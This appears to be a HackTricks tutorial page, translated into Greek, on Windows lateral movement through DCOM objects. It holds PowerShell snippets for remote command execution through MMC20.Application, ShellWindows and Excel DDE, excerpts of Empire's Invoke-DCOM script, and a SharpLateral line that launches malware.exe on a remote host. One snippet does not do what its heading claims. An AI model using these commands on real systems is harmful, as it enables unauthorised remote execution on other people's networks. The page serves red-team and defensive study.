# DCOM Exec

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

**Try Hard Security Group**

<figure><img src="https://github.com/carlospolop/hacktricks/blob/gr/windows-hardening/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## MMC20.Application

**Για περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική, ελέγξτε την αρχική δημοσίευση από** [**https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/**](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)

Τα αντικείμενα Distributed Component Object Model (DCOM) παρουσιάζουν μια ενδιαφέρουσα δυνατότητα για δικτυακές αλληλεπιδράσεις με αντικείμενα. Η Microsoft παρέχει λεπτομερή τεκμηρίωση τόσο για το DCOM όσο και για το Component Object Model (COM), προσβάσιμη [εδώ για το DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) και [εδώ για το COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Μια λίστα με εφαρμογές DCOM μπορεί να ανακτηθεί χρησιμοποιώντας την εντολή PowerShell:

```bash
Get-CimInstance Win32_DCOMApplication
```

Το COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), επιτρέπει τη σεναριοποίηση των λειτουργιών του MMC snap-in. Ιδιαίτερα, αυτό το object περιέχει έναν μέθοδο `ExecuteShellCommand` υπό το `Document.ActiveView`. Περισσότερες πληροφορίες σχετικά με αυτήν τη μέθοδο μπορούν να βρεθούν [εδώ](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Ελέγξτε το εκτελώντας:

Αυτό το χαρακτηριστικό διευκολύνει την εκτέλεση εντολών μέσω δικτύου μέσω μιας εφαρμογής DCOM. Για να αλληλεπιδράσετε με το DCOM απομακρυσμένα ως διαχειριστής, το PowerShell μπορεί να χρησιμοποιηθεί ως εξής:

```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

Αυτή η εντολή συνδέεται στην εφαρμογή DCOM και επιστρέφει μια παράδειγμα του αντικειμένου COM. Η μέθοδος ExecuteShellCommand μπορεί στη συνέχεια να κληθεί για να εκτελέσει ένα διεργασία στον απομακρυσμένο υπολογιστή. Η διαδικασία περιλαμβάνει τα ακόλουθα βήματα:

Έλεγχος μεθόδων:

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Αποκτήστε ελέγχους απομακρυσμένης εκτέλεσης (RCE):

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```

## ShellWindows & ShellBrowserWindow

**Για περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική, ελέγξτε την αρχική δημοσίευση** [**https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/**](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

Αναγνωρίστηκε ότι το αντικείμενο **MMC20.Application** δεν έχει σαφή "LaunchPermissions," προεπιλέγοντας άδειες που επιτρέπουν πρόσβαση στους Διαχειριστές. Για περαιτέρω λεπτομέρειες, μπορεί να εξεταστεί ένα νήμα [εδώ](https://twitter.com/tiraniddo/status/817532039771525120), και συνιστάται η χρήση του [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET για το φιλτράρισμα αντικειμένων χωρίς σαφείς άδειες εκκίνησης.

Δύο συγκεκριμένα αντικείμενα, `ShellBrowserWindow` και `ShellWindows`, τόνισαν λόγω έλλειψης σαφών άδειων εκκίνησης. Η απουσία εγγραφής καταχώρισης `LaunchPermission` κάτω από `HKCR:\AppID\{guid}` σημαίνει ότι δεν υπάρχουν σαφείς άδειες.

### ShellWindows

Για το `ShellWindows`, το οποίο δεν έχει ProgID, οι μέθοδοι .NET `Type.GetTypeFromCLSID` και `Activator.CreateInstance` διευκολύνουν την αρχικοποίηση αντικειμένου χρησιμοποιώντας το AppID του. Αυτή η διαδικασία εκμεταλλεύεται το OleView .NET για την ανάκτηση του CLSID για το `ShellWindows`. Μόλις αρχικοποιηθεί, η αλληλεπίδραση είναι δυνατή μέσω της μεθόδου `WindowsShell.Item`, οδηγώντας σε κλήση μεθόδου όπως `Document.Application.ShellExecute`.

Παρατίθενται παραδειγματικές εντολές PowerShell για την αρχικοποίηση του αντικειμένου και την εκτέλεση εντολών απομακρυσμένα:

```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### Πλευρική Κίνηση με Αντικείμενα DCOM του Excel

Η πλευρική κίνηση μπορεί να επιτευχθεί εκμεταλλευόμενη τα αντικείμενα DCOM του Excel. Για λεπτομερείς πληροφορίες, συνιστάται η ανάγνωση της συζήτησης για την εκμετάλλευση του Excel DDE για πλευρική κίνηση μέσω DCOM στο [blog της Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Το έργο Empire παρέχει ένα σενάριο PowerShell, το οποίο δείχνει τη χρήση του Excel για απομακρυσμένη εκτέλεση κώδικα (RCE) με τη χρήση της διαχείρισης αντικειμένων DCOM. Παρακάτω παρατίθενται αποσπάσματα από το σενάριο που είναι διαθέσιμο στο [αποθετήριο GitHub του Empire](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1), που δείχνουν διαφορετικές μεθόδους κατάχρησης του Excel για RCE:

```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```

### Εργαλεία Αυτοματισμού για Πλευρική Κίνηση

Δύο εργαλεία τονίζονται για την αυτοματοποίηση αυτών των τεχνικών:

* **Invoke-DCOM.ps1**: Ένα σενάριο PowerShell που παρέχεται από το έργο Empire και απλοποιεί την εκκίνηση διαφόρων μεθόδων για την εκτέλεση κώδικα σε απομακρυσμένους υπολογιστές. Αυτό το σενάριο είναι προσβάσιμο στο αποθετήριο του Empire στο GitHub.
* **SharpLateral**: Ένα εργαλείο σχεδιασμένο για την εκτέλεση κώδικα απομακρυσμένα, το οποίο μπορεί να χρησιμοποιηθεί με την εντολή:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

## Αυτόματα Εργαλεία

* Το Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) επιτρέπει την εύκολη εκτέλεση όλων των σχολιασμένων τρόπων για την εκτέλεση κώδικα σε άλλα μηχανήματα.
* Μπορείτε επίσης να χρησιμοποιήσετε το [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

## Αναφορές

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

**Ομάδα Ασφάλειας Try Hard**

<figure><img src="https://github.com/carlospolop/hacktricks/blob/gr/windows-hardening/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
